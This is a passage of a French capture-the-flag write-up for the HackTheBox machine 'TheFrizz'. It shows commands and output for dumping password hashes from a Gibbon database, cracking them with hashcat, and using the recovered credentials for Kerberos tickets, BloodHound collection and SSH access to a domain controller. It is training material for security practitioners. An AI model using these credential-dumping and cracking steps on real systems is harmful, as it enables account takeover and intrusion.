+</span></span><span class="line"><span class="cl"><span class="n">phone4Type</span>      <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;Mobile&#39;</span><span class="p">,</span><span class="s1">&#39;Home&#39;</span><span class="p">,</span><span class="s1">&#39;Work&#39;</span><span class="p">,</span><span class="s1">&#39;Fax&#39;</span><span class="p">,</span><span class="s1">&#39;Pager&#39;</span><span class="p">,</span><span class="s1">&#39;Other&#39;</span><span class="p">)</span>   <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone4CountryCode</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">7</span><span class="p">)</span>      <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">phone4</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">website</span> <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">languageFirst</span>   <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">languageSecond</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">languageThird</span>   <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">countryOfBirth</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">birthCertificateScan</span>    <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">ethnicity</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">religion</span>        <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">profession</span>      <span class="n">varchar</span><span class="p">(</span><span class="mf">90</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">employer</span>        <span class="n">varchar</span><span class="p">(</span><span class="mf">90</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">jobTitle</span>        <span class="n">varchar</span><span class="p">(</span><span class="mf">90</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency1Name</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">90</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency1Number1</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency1Number2</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency1Relationship</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency2Name</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">90</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency2Number1</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency2Number2</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">emergency2Relationship</span>  <span class="n">varchar</span><span class="p">(</span><span class="mf">30</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonHouseID</span>   <span class="n">int</span><span class="p">(</span><span class="mf">3</span><span class="p">)</span> <span class="n">unsigned</span> <span class="n">zerofill</span>        <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">studentID</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">15</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">dateStart</span>       <span class="n">date</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">dateEnd</span> <span class="n">date</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonSchoolYearIDClassOf</span>       <span class="n">int</span><span class="p">(</span><span class="mf">3</span><span class="p">)</span> <span class="n">unsigned</span> <span class="n">zerofill</span>        <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">lastSchool</span>      <span class="n">varchar</span><span class="p">(</span><span class="mf">100</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">nextSchool</span>      <span class="n">varchar</span><span class="p">(</span><span class="mf">100</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">departureReason</span> <span class="n">varchar</span><span class="p">(</span><span class="mf">50</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">transport</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">transportNotes</span>  <span class="n">text</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">calendarFeedPersonal</span>    <span class="n">text</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">viewCalendarSchool</span>      <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>   <span class="n">NO</span>              <span class="n">Y</span>
+</span></span><span class="line"><span class="cl"><span class="n">viewCalendarPersonal</span>    <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>   <span class="n">NO</span>              <span class="n">Y</span>
+</span></span><span class="line"><span class="cl"><span class="n">viewCalendarSpaceBooking</span>        <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>   <span class="n">NO</span>              <span class="n">N</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonApplicationFormID</span> <span class="n">int</span><span class="p">(</span><span class="mf">12</span><span class="p">)</span> <span class="n">unsigned</span> <span class="n">zerofill</span>       <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">lockerNumber</span>    <span class="n">varchar</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">vehicleRegistration</span>     <span class="n">varchar</span><span class="p">(</span><span class="mf">20</span><span class="p">)</span>     <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">personalBackground</span>      <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">messengerLastRead</span>       <span class="n">datetime</span>        <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">privacy</span> <span class="n">text</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">dayType</span> <span class="n">varchar</span><span class="p">(</span><span class="mf">255</span><span class="p">)</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibbonThemeIDPersonal</span>   <span class="n">int</span><span class="p">(</span><span class="mf">4</span><span class="p">)</span> <span class="n">unsigned</span> <span class="n">zerofill</span>        <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">gibboni18nIDPersonal</span>    <span class="n">int</span><span class="p">(</span><span class="mf">4</span><span class="p">)</span> <span class="n">unsigned</span> <span class="n">zerofill</span>        <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">studentAgreements</span>       <span class="n">text</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">googleAPIRefreshToken</span>   <span class="n">text</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">microsoftAPIRefreshToken</span>        <span class="n">text</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">genericAPIRefreshToken</span>  <span class="n">text</span>    <span class="n">NO</span>              <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">receiveNotificationEmails</span>       <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>   <span class="n">NO</span>              <span class="n">Y</span>
+</span></span><span class="line"><span class="cl"><span class="n">mfaSecret</span>       <span class="n">varchar</span><span class="p">(</span><span class="mf">16</span><span class="p">)</span>     <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">mfaToken</span>        <span class="n">text</span>    <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">cookieConsent</span>   <span class="n">enum</span><span class="p">(</span><span class="s1">&#39;Y&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">)</span>   <span class="n">YES</span>             <span class="n">NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">fields</span>  <span class="n">text</span>    <span class="n">NO</span>              <span class="n">NULL</span></span></span></code></pre></div></div>
+<p>Je récupère alors le hash ainsi que le <code>salt</code> de l&rsquo;utilisateur <code>f.frizzle</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">SHELL</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">mysql</span><span class="p">.</span><span class="py">exe</span> <span class="n">-u</span> <span class="n">MrGibbonsDB</span> <span class="n">-p</span><span class="s2">&#34;MisterGibbs!Parrot!?1&#34;</span> <span class="n">-e</span> <span class="s2">&#34;use gibbon; select username,passwordStrong,passwordStrongSalt,passwordForceReset from  gibbonperson;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span>        <span class="n">passwordStrong</span>  <span class="n">passwordStrongSalt</span>      <span class="n">passwordForceReset</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="p">.</span><span class="n">frizzle</span>       <span class="n">067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03</span>        <span class="p">/</span><span class="n">aACFhikmNopqrRTVz2489</span>  <span class="n">N</span></span></span></code></pre></div></div>
+<h3 id="hashcat">Hashcat</h3>
+<p>Dans la documentation de <a href="https://github.com/GibbonEdu/core/blob/v30.0.00/preferencesPasswordProcess.php" target="_blank" rel="noopener noreffer ">Gibbon</a>, je vois que le mot de passe est le <code>salt+passwordStrong</code>.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-6.png"
+        data-srcset="/images/TheFrizz/TheFrizz-6.png, /images/TheFrizz/TheFrizz-6.png 1.5x, /images/TheFrizz/TheFrizz-6.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-6.png"
+        title="/images/TheFrizz/TheFrizz-6.png" width="1163" height="398" /></p>
+<p>Je mets alors le hash et le salt dans un fichier sous le format <strong><code>hash:salt</code></strong> et je le craque avec le mode <strong><code>1420</code></strong> de <code>hashcat</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>root@exegol-htb<span class="o">]</span> /workspace/TheFrizz
+</span></span><span class="line"><span class="cl">❯ hashcat -m <span class="m">1420</span> <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting
+</span></span><span class="line"><span class="cl">&lt;snip&gt;
+</span></span><span class="line"><span class="cl">067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni_Luvs_Magic23
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Session..........: hashcat
+</span></span><span class="line"><span class="cl">Status...........: Cracked
+</span></span><span class="line"><span class="cl">Hash.Mode........: <span class="m">1420</span> <span class="o">(</span>sha256<span class="o">(</span><span class="nv">$salt</span>.<span class="nv">$pass</span><span class="o">))</span>
+</span></span><span class="line"><span class="cl">Hash.Target......: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff...Vz2489
+</span></span><span class="line"><span class="cl">Time.Started.....: Mon Aug <span class="m">25</span> 16:25:43 <span class="m">2025</span> <span class="o">(</span><span class="m">1</span> sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Time.Estimated...: Mon Aug <span class="m">25</span> 16:25:44 <span class="m">2025</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Kernel.Feature...: Pure Kernel
+</span></span><span class="line"><span class="cl">Guess.Base.......: File <span class="o">(</span>/usr/share/wordlists/rockyou.txt<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Guess.Queue......: 1/1 <span class="o">(</span>100.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Speed.#1.........:  9975.2 kH/s <span class="o">(</span>0.59ms<span class="o">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
+</span></span><span class="line"><span class="cl">Recovered........: 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>total<span class="o">)</span>, 1/1 <span class="o">(</span>100.00%<span class="o">)</span> Digests <span class="o">(</span>new<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Progress.........: 11026432/14344384 <span class="o">(</span>76.87%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Rejected.........: 0/11026432 <span class="o">(</span>0.00%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Point....: 11010048/14344384 <span class="o">(</span>76.76%<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+</span></span><span class="line"><span class="cl">Candidate.Engine.: Device Generator
+</span></span><span class="line"><span class="cl">Candidates.#1....: Joyster -&gt; James<span class="p">&amp;</span>Ciara
+</span></span><span class="line"><span class="cl">Hardware.Mon.#1..: Temp: 89c Util: 41%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Started: Mon Aug <span class="m">25</span> 16:25:29 <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">Stopped: Mon Aug <span class="m">25</span> 16:25:45 <span class="m">2025</span></span></span></code></pre></div></div>
+<p>Les identifiants <code>f.frizzle:Jenni_Luvs_Magic23</code> sont valides. Je vois aussi que l&rsquo;authentification <code>NTLM</code> est désactivée.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb frizzdc.frizz.htb -u <span class="s1">&#39;f.frizzle&#39;</span> -p <span class="s1">&#39;Jenni_Luvs_Magic23&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.232.168  <span class="m">445</span>    10.129.232.168   <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:10.129.232.168<span class="o">)</span> <span class="o">(</span>domain:10.129.232.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         10.129.232.168  <span class="m">445</span>    10.129.232.168   <span class="o">[</span>-<span class="o">]</span> 10.129.232.168<span class="se">\f</span>.frizzle:Jenni_Luvs_Magic23 STATUS_NOT_SUPPORTED
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
+</span></span><span class="line"><span class="cl">╰─➤  faketime <span class="s2">&#34;</span><span class="k">$(</span>rdate -n frizzdc.frizz.htb -p <span class="p">|</span> awk <span class="s1">&#39;{print $2, $3, $4}&#39;</span> <span class="p">|</span> date -f - <span class="s2">&#34;+%Y-%m-%d %H:%M:%S&#34;</span><span class="k">)</span><span class="s2">&#34;</span> zsh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb frizzdc.frizz.htb -u <span class="s1">&#39;f.frizzle&#39;</span> -p <span class="s1">&#39;Jenni_Luvs_Magic23&#39;</span> -k
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:frizzdc<span class="o">)</span> <span class="o">(</span>domain:frizz.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>+<span class="o">]</span> frizz.htb<span class="se">\f</span>.frizzle:Jenni_Luvs_Magic23</span></span></code></pre></div></div>
+<p>Je génère alors un fichier <code>/etc/krb5.conf</code></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
+</span></span><span class="line"><span class="cl">╰─➤  nxc smb frizzdc.frizz.htb -u <span class="s1">&#39;f.frizzle&#39;</span> -p <span class="s1">&#39;Jenni_Luvs_Magic23&#39;</span> -k --generate-krb5-file /etc/krb5.conf
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>*<span class="o">]</span>  x64 <span class="o">(</span>name:frizzdc<span class="o">)</span> <span class="o">(</span>domain:frizz.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>NTLM:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB         frizzdc.frizz.htb <span class="m">445</span>    frizzdc          <span class="o">[</span>+<span class="o">]</span> frizz.htb<span class="se">\f</span>.frizzle:Jenni_Luvs_Magic23</span></span></code></pre></div></div>
+<h3 id="bloodhound">BloodHound</h3>
+<p>Je génère un <code>TGT</code> en pour <code>f.frizzle</code> et je lance <code>bloodhound</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main›
+</span></span><span class="line"><span class="cl">╰─➤  getTGT.py <span class="s1">&#39;frizz.htb/f.frizzle:Jenni_Luvs_Magic23&#39;</span>
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving ticket in f.frizzle.ccache
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main*›
+</span></span><span class="line"><span class="cl">╰─➤  <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>f.frizzle.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root@exegol-hackthebox /workspace/TheFrizz/gibbon-cracker  ‹main*›
+</span></span><span class="line"><span class="cl">╰─➤  nxc ldap frizzdc.frizz.htb -u <span class="s1">&#39;f.frizzle&#39;</span> -p <span class="s1">&#39;Jenni_Luvs_Magic23&#39;</span> -k --bloodhound -c All --dns-server 10.129.232.168
+</span></span><span class="line"><span class="cl">LDAP        frizzdc.frizz.htb <span class="m">389</span>    FRIZZDC          <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:FRIZZDC<span class="o">)</span> <span class="o">(</span>domain:frizz.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">LDAP        frizzdc.frizz.htb <span class="m">389</span>    FRIZZDC          <span class="o">[</span>+<span class="o">]</span> frizz.htb<span class="se">\f</span>.frizzle:Jenni_Luvs_Magic23
+</span></span><span class="line"><span class="cl">LDAP        frizzdc.frizz.htb <span class="m">389</span>    FRIZZDC          Resolved collection methods: session, container, psremote, objectprops, localadmin, rdp, acl, trusts, dcom, group
+</span></span><span class="line"><span class="cl">LDAP        frizzdc.frizz.htb <span class="m">389</span>    FRIZZDC          Using kerberos auth without ccache, getting TGT
+</span></span><span class="line"><span class="cl">LDAP        frizzdc.frizz.htb <span class="m">389</span>    FRIZZDC          Done in 00M 14S
+</span></span><span class="line"><span class="cl">LDAP        frizzdc.frizz.htb <span class="m">389</span>    FRIZZDC          Compressing output into /root/.nxc/logs/FRIZZDC_frizzdc.frizz.htb_2025-08-05_065417_bloodhound.zip</span></span></code></pre></div></div>
+<p>Je vois que <code>f.frizzle</code> est membre du groupe <code>Remote Management Users</code>. A part ça, il ne présente rien d’intéressant.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-5.png"
+        data-srcset="/images/TheFrizz/TheFrizz-5.png, /images/TheFrizz/TheFrizz-5.png 1.5x, /images/TheFrizz/TheFrizz-5.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-5.png"
+        title="/images/TheFrizz/TheFrizz-5.png" width="881" height="627" /></p>
+<h3 id="ssh">SSH</h3>
+<p>Il faut s&rsquo;assurer d&rsquo;avoir cette configuration dans le fichier <code>/etc/hosts</code>. Car lorsqu&rsquo;il essayera de faire la résolution DNS, il doit trouver en premier soit le FQDN complet soit juste le nom de la machine.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">10.129.187.99 frizzdc.frizz.htb frizzdc frizz.htb</span></span></code></pre></div></div>
+<p>Je me connecte alors par SSH avec l&rsquo;option <strong><code>-K</code></strong>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-shell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">ssh -K f.frizzle@frizzdc.frizz.htb</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/TheFrizz/TheFrizz-7.png"
+        data-srcset="/images/TheFrizz/TheFrizz-7.png, /images/TheFrizz/TheFrizz-7.png 1.5x, /images/TheFrizz/TheFrizz-7.png 2x"
+        data-sizes="auto"
+        alt="/images/TheFrizz/TheFrizz-7.png"
+        title="/images/TheFrizz/TheFrizz-7.png" width="959" height="726" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.gifer.com/origin/78/78d8a1c39b0d5158a748cb62f4942fe0_w200.webp"
+        data-srcset="https://i.gifer.com/origin/78/78d8a1c39b0d5158a748cb62f4942fe0_w200.webp, https://i.gifer.com/origin/78/78d8a1c39b0d5158a748cb62f4942fe0_w200.webp 1.5x, https://i.gifer.com/origin/78/78d8a1c39b0d5158a748cb62f4942fe0_w200.webp 2x"
+        data-sizes="auto"
+        alt="https://i.gifer.com/origin/78/78d8a1c39b0d5158a748cb62f4942fe0_w200.webp"
+        title="https://i.gifer.com/origin/78/78d8a1c39b0d5158a748cb62f4942fe0_w200.webp" /></p>
+<h2 id="shell-en-tant-que-mschoolbus">Shell en tant que M.Schoolbus</h2>
+<h3 id="corbeille">Corbeille</h3>
+<p>A la racine, je vois en énumérant les fichiers cachée, le répertoire de la Corbeille. J&rsquo;y trouve un dossier appartenant à l&rsquo;utilisateur <code>f.frizzle</code> dans lequel se trouve deux fichiers. Le premier <code>$IE2XMEG.7z</code> contient les métadonnées du fichier original et le second <code>$RE2XMEG.7z</code> est le fichier.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">f</span><span class="p">.</span><span class="n">frizzle</span><span class="p">&gt;</span> <span class="nb">cd </span><span class="p">/</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\&gt;</span> <span class="nb">ls
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
